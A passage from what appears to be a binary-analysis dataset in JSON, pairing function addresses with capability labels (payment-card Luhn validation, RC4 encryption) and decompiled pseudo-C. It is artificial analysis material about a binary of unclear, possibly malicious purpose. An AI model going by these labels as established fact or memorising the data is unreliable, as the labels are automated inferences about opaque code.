        "decompiled_code": "\nvoid __fastcall fcn.00447512(uint *param_1)\n\n{\n    uint arg_10h;\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_14h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    arg_10h = param_1[1];\n    arg_8h = **param_1;\n    uVar1 = fcn.0045f756(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    var_460h = **param_1;\n    arg_14h = *param_1[3];\n    fcn.00446e5b(&var_460h, *param_1[2], param_1[2][1], arg_14h, param_1[1], *param_1[4]);\n    var_ch = 0;\n    fcn.00448cd5();\n    fcn.004473c0();\n    fcn.0045f801(var_464h, arg_8h, arg_10h);\n    fcn.004303e9(arg_14h);\n    return;\n}\n",
        "token_count": 307
    },
    "004475d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004475d2(uint *param_1)\n\n{\n    uint arg_10h;\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_14h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    arg_10h = param_1[1];\n    arg_8h = **param_1;\n    uVar1 = fcn.0045f756(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    var_460h = **param_1;\n    arg_14h = *param_1[3];\n    fcn.00446e5b(&var_460h, *param_1[2], param_1[2][1], arg_14h, param_1[1], *param_1[4]);\n    var_ch = 0;\n    fcn.00449269();\n    fcn.004473c0();\n    fcn.0045f801(var_464h, arg_8h, arg_10h);\n    fcn.004303e9(arg_14h);\n    return;\n}\n",
        "token_count": 307
    },
    "00447680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447680(uint *param_1)\n\n{\n    uint arg_10h;\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_14h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    arg_10h = param_1[1];\n    arg_8h = **param_1;\n    uVar1 = fcn.0045f756(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    var_460h = **param_1;\n    arg_14h = *param_1[3];\n    fcn.00446f29(&var_460h, *param_1[2], param_1[2][1], arg_14h, param_1[1], *param_1[4]);\n    var_ch = 0;\n    fcn.0044a241();\n    fcn.004473c0();\n    fcn.0045f801(var_464h, arg_8h, arg_10h);\n    fcn.004303e9(arg_14h);\n    return;\n}\n",
        "token_count": 306
    },
    "00447725": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447725(uint *param_1)\n\n{\n    uint arg_10h;\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_14h;\n    uint var_acch;\n    uint var_ac8h;\n    uint32_t var_ac4h;\n    uint var_ac0h;\n    uint var_abch;\n    uint var_ab8h;\n    uint var_ab4h;\n    uint var_a78h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    arg_10h = param_1[1];\n    arg_8h = **param_1;\n    uVar1 = fcn.0045f756(arg_8h);\n    var_ac4h = var_ac4h & 0xffffff00 | uVar1;\n    var_ab8h = *param_1[4];\n    var_abch = *param_1[3];\n    var_acch = *param_1[2];\n    var_ac8h = param_1[2][1];\n    var_ac0h = **param_1;\n    arg_14h = param_1[1];\n    fcn.0043c078(&var_ac0h, &var_acch, &var_abch, arg_14h, &var_ab8h);\n    fcn.00448f95();\n    fcn.004473c0();\n    fcn.0045f801(var_ac4h, arg_8h, arg_10h);\n    fcn.004303e9(arg_14h);\n    return;\n}\n",
        "token_count": 358
    },
    "004477f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004477f3(uint *param_1)\n\n{\n    uint arg_10h;\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_14h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    arg_10h = param_1[1];\n    arg_8h = **param_1;\n    uVar1 = fcn.0045f756(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    var_460h = **param_1;\n    arg_14h = *param_1[3];\n    fcn.00446f29(&var_460h, *param_1[2], param_1[2][1], arg_14h, param_1[1], *param_1[4]);\n    var_ch = 0;\n    fcn.00449dd1();\n    fcn.004473c0();\n    fcn.0045f801(var_464h, arg_8h, arg_10h);\n    fcn.004303e9(arg_14h);\n    return;\n}\n",
        "token_count": 307
    },
    "0044b17f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044b17f(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint32_t var_4h;\n    \n    cVar2 = fcn.0044ac76();\n    if (cVar2 == '\\0') {\n        iVar3 = *(param_1 + 8);\n        *(param_1 + 0x38) = 0;\n        if (*(iVar3 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        uVar1 = *(param_1 + 0x2d);\n        iVar3 = fcn.00455ad2(**(iVar3 + 0xc), uVar1, 0x8000);\n        if (iVar3 == 0) {\n            var_4h = param_1 & 0xffffff00 | uVar1;\n        }\n        else {\n            fcn.00454e8e(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x14, *(param_1 + 8));\n            uVar1 = **(param_1 + 0xc);\n            *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n            *(param_1 + 0x2d) = uVar1;\n            if (uVar1 == 0) {\n                iVar3 = *(param_1 + 8);\n                *(iVar3 + 0x1c) = 1;\n                *(iVar3 + 0x18) = 0x16;\n                fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                iVar3 = *(param_1 + 8);\n                *(iVar3 + 0x1c) = 1;\n                *(iVar3 + 0x18) = 0x16;\n                fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                return 0;\n            }\n            var_4h = param_1 & 0xffffff00 | uVar1;\n        }\n        fcn.00454e8e(var_4h, param_1 + 0x14, *(param_1 + 8));\n    }\n    return 1;\n}\n",
        "token_count": 540
    },
    "00451c54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451c54(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uchar *puVar3;\n    char cVar4;\n    uint arg_10h;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    \n    puVar7 = param_1 + 0xf;\n    cVar4 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar4 == '\\0') {\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        puVar3 = param_1[4];\n        param_1[4] = puVar3 + 4;\n        *puVar6 = *puVar3;\n        param_1[0xd] = 1;\n    }\n    else {\n        puVar2 = param_1[4];\n        param_1[4] = puVar2 + 2;\n        uVar1 = *puVar2;\n        arg_10h = fcn.0043d565();\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        iVar5 = fcn.0045eb63(param_1 + 0xd, puVar6, arg_10h, uVar1, param_1[2]);\n        if (iVar5 != 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    puVar6 = param_1[0x110];\n    if (puVar6 != NULL) {\n        puVar7 = puVar6;\n    }\n    param_1[0xc] = puVar7;\n    return CONCAT31(puVar6 >> 8, 1);\n}\n",
        "token_count": 452
    },
    "00451ce9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451ce9(uint *param_1)\n\n{\n    char cVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    cVar1 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        cVar1 = fcn.0043deed(puVar3);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.0044ac12();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        param_1[0xd] = 1;\n    }\n    else {\n        var_4h = var_4h & 0xffff0000;\n        cVar1 = fcn.0043fa21(&var_4h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.0044ac12();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        arg_10h = fcn.0043d565();\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        iVar2 = fcn.0045eb63(param_1 + 0xd, puVar3, arg_10h, var_4h, param_1[2]);\n        if (iVar2 != 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    puVar3 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar3 = param_1[0x110];\n    }\n    param_1[0xc] = puVar3;\n    return 1;\n}\n",
        "token_count": 511
    },
    "00451da8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451da8(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uchar *puVar3;\n    char cVar4;\n    uint arg_10h;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    \n    puVar7 = param_1 + 0xf;\n    cVar4 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar4 == '\\0') {\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        puVar3 = param_1[4];\n        param_1[4] = puVar3 + 4;\n        *puVar6 = *puVar3;\n        param_1[0xd] = 1;\n    }\n    else {\n        puVar2 = param_1[4];\n        param_1[4] = puVar2 + 2;\n        uVar1 = *puVar2;\n        arg_10h = fcn.0043d565();\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        iVar5 = fcn.0045eb63(param_1 + 0xd, puVar6, arg_10h, uVar1, param_1[2]);\n        if (iVar5 != 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    puVar6 = param_1[0x110];\n    if (puVar6 != NULL) {\n        puVar7 = puVar6;\n    }\n    param_1[0xc] = puVar7;\n    return CONCAT31(puVar6 >> 8, 1);\n}\n",
        "token_count": 452
    },
    "00451e3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451e3d(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uchar *puVar3;\n    char cVar4;\n    uint arg_10h;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    \n    puVar7 = param_1 + 0xf;\n    cVar4 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar4 == '\\0') {\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        puVar3 = param_1[4];\n        param_1[4] = puVar3 + 4;\n        *puVar6 = *puVar3;\n        param_1[0xd] = 1;\n    }\n    else {\n        puVar2 = param_1[4];\n        param_1[4] = puVar2 + 2;\n        uVar1 = *puVar2;\n        arg_10h = fcn.0043d565();\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        iVar5 = fcn.0045eb63(param_1 + 0xd, puVar6, arg_10h, uVar1, param_1[2]);\n        if (iVar5 != 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    puVar6 = param_1[0x110];\n    if (puVar6 != NULL) {\n        puVar7 = puVar6;\n    }\n    param_1[0xc] = puVar7;\n    return CONCAT31(puVar6 >> 8, 1);\n}\n",
        "token_count": 453
    },
    "00451ed2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451ed2(uint *param_1)\n\n{\n    char cVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    cVar1 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        cVar1 = fcn.0043df7b(puVar3);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.0044ac28();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        param_1[0xd] = 1;\n    }\n    else {\n        var_4h = var_4h & 0xffff0000;\n        cVar1 = fcn.0043fab3(&var_4h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.0044ac28();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        arg_10h = fcn.0043d565();\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        iVar2 = fcn.0045eb63(param_1 + 0xd, puVar3, arg_10h, var_4h, param_1[2]);\n        if (iVar2 != 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    puVar3 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar3 = param_1[0x110];\n    }\n    param_1[0xc] = puVar3;\n    return 1;\n}\n",
        "token_count": 512
    },
    "00451f91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451f91(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uchar *puVar3;\n    char cVar4;\n    uint arg_10h;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    \n    puVar7 = param_1 + 0xf;\n    cVar4 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar4 == '\\0') {\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        puVar3 = param_1[4];\n        param_1[4] = puVar3 + 4;\n        *puVar6 = *puVar3;\n        param_1[0xd] = 1;\n    }\n    else {\n        puVar2 = param_1[4];\n        param_1[4] = puVar2 + 2;\n        uVar1 = *puVar2;\n        arg_10h = fcn.0043d565();\n        puVar6 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar6 = puVar7;\n        }\n        iVar5 = fcn.0045eb63(param_1 + 0xd, puVar6, arg_10h, uVar1, param_1[2]);\n        if (iVar5 != 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    puVar6 = param_1[0x110];\n    if (puVar6 != NULL) {\n        puVar7 = puVar6;\n    }\n    param_1[0xc] = puVar7;\n    return CONCAT31(puVar6 >> 8, 1);\n}\n",
        "token_count": 452
    },
    "00452026": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00452026(uint *param_1)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *var_4h;\n    \n    puVar1 = param_1[4];\n    *(param_1 + 0xe) = 1;\n    param_1[4] = puVar1 + 2;\n    var_4h._0_2_ = *puVar1;\n    var_4h = param_1;\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        iVar4 = param_1[2];\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        if (*(iVar4 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        iVar4 = fcn.0045ee07(puVar3, &var_4h, *(*(iVar4 + 0xc) + 4), iVar4);\n        if (iVar4 < 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x110];\n    puVar5 = param_1 + 0xf;\n    if (puVar3 != NULL) {\n        puVar5 = puVar3;\n    }\n    param_1[0xc] = puVar5;\n    param_1[0xd] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 524
    },
    "00452199": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00452199(uint *param_1)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *var_4h;\n    \n    puVar1 = param_1[4];\n    *(param_1 + 0xe) = 1;\n    param_1[4] = puVar1 + 2;\n    var_4h._0_2_ = *puVar1;\n    var_4h = param_1;\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        iVar4 = param_1[2];\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        if (*(iVar4 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        iVar4 = fcn.0045ee07(puVar3, &var_4h, *(*(iVar4 + 0xc) + 4), iVar4);\n        if (iVar4 < 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x110];\n    puVar5 = param_1 + 0xf;\n    if (puVar3 != NULL) {\n        puVar5 = puVar3;\n    }\n    param_1[0xc] = puVar5;\n    param_1[0xd] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 524
    },
    "00452241": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00452241(uint *param_1)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *var_4h;\n    \n    puVar1 = param_1[4];\n    *(param_1 + 0xe) = 1;\n    param_1[4] = puVar1 + 2;\n    var_4h._0_2_ = *puVar1;\n    var_4h = param_1;\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        iVar4 = param_1[2];\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        if (*(iVar4 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        iVar4 = fcn.0045ee07(puVar3, &var_4h, *(*(iVar4 + 0xc) + 4), iVar4);\n        if (iVar4 < 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x110];\n    puVar5 = param_1 + 0xf;\n    if (puVar3 != NULL) {\n        puVar5 = puVar3;\n    }\n    param_1[0xc] = puVar5;\n    param_1[0xd] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 524
    },
    "004523b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004523b4(uint *param_1)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *var_4h;\n    \n    puVar1 = param_1[4];\n    *(param_1 + 0xe) = 1;\n    param_1[4] = puVar1 + 2;\n    var_4h._0_2_ = *puVar1;\n    var_4h = param_1;\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        iVar4 = param_1[2];\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        if (*(iVar4 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        iVar4 = fcn.0045ee07(puVar3, &var_4h, *(*(iVar4 + 0xc) + 4), iVar4);\n        if (iVar4 < 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = param_1 + 0xf;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x110];\n    puVar5 = param_1 + 0xf;\n    if (puVar3 != NULL) {\n        puVar5 = puVar3;\n    }\n    param_1[0xc] = puVar5;\n    param_1[0xd] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 525
    },
    "00453bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453bd0(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.0043b89e();\n    *(param_1 + 0xc) = *(arg_8h + 0x4c);\n    *(param_1 + 0x10) = *(arg_8h + 0x48);\n    fcn.0045df41(arg_8h, param_1 + 0xc, *(param_1 + 4));\n    fcn.0045df9f(arg_8h, param_1 + 0x10, *(param_1 + 4));\n    if ((*(arg_8h + 0x350) & 2) == 0) {\n        *(arg_8h + 0x350) = *(arg_8h + 0x350) | 2;\n        *(param_1 + 0x14) = 2;\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00454002": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00454002(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    if (*in_ECX == 0) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        uVar1 = fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n        uVar1 = uVar1 & 0xffffff00;\n    }\n    else {\n        uVar1 = fcn.00454c1b(*in_ECX);\n    }\n    return uVar1;\n}\n",
        "token_count": 163
    },
    "0045403a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045403a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = *in_ECX;\n    if (iVar1 == 0) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 130
    },
    "0045406b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045406b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = *in_ECX;\n    if (iVar1 == 0) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 130
    },
    "0045409c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045409c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = *in_ECX;\n    if (iVar1 == 0) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 130
    },
    "004540cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004540cd(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_ECX;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar2 = fcn.0044805d(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar2 == '\\0') {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 249
    },
    "0045412f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045412f(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_ECX;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar2 = fcn.00448177(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar2 == '\\0') {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 249
    },
    "00454191": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00454191(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_ECX;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar2 = fcn.00448291(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar2 == '\\0') {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 248
    },
    "004541f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
